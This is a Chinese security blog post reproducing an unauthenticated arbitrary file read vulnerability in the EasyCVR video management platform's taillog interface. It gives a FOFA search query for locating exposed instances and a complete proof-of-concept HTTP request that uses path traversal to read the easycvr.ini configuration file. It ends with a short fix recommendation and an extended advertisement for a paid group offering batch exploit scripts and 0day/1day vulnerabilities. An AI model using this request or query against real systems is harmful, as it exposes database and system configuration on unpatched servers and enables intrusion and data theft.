#  「漏洞复现」EasyCVR-视频管理平台 taillog 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-12-07 09:53  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
EasyCVR视频管理平台，作为TSINGSEE青犀视频旗下的一款重要产品，是一款功能强大的视频融合+AI智能分析网关平台。平台基于分布式、负载均衡等流媒体技术，提供广泛兼容、安全可靠、开放共享的视频综合服务。它支持多协议的设备视频接入、采集、AI智能检测、处理、分发、管理等服务，并具备轻量化接入、传输、处理与分发能力，可实现一站式视频融合共享管理。支持RTSP、RTMP、GB28181、GB35114、海康Ehome、大华SDK、海康SDK等多种协议的视频设备接入，兼容市面上几乎所有视频终端。  
  
0x03  
  
漏洞威胁  
  
EasyCVR-视频管理平台 taillog 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
title="EasyCVR"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0r9OKtY7NM2WbFY4H2rutiaZ7t1OPriaAjvCAGqJPHW3cTqmCibbHVbF2098ttzBxQibSWQj5uKxGlwwQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0r9OKtY7NM2WbFY4H2rutiaZ99WqTibcZJyndpJ4bgwGNegjKJ1j1rmRib3Ea3RrfX2AQEpjibYhkMXdQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0r9OKtY7NM2WbFY4H2rutiaZnzKlYyd6x3cVy4UohliceVQcjUOUy6rDZdCTnCHJ170Lro9o3e09Yjg/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问控制  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0r9OKtY7NM2WbFY4H2rutiaZLsNAoy2JyTUNApDpjBVu5f5z3AKSzdTPOzOodDxze89j1gTSFOByLA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0r9OKtY7NM2WbFY4H2rutiaZQeTRXhM4wDggorKGzr3EX3toRBwJFRFJn3IW3X15xRicSN8E9EnjnicA/640?wx_fmt=gif&from=appmsg "")  
  
  
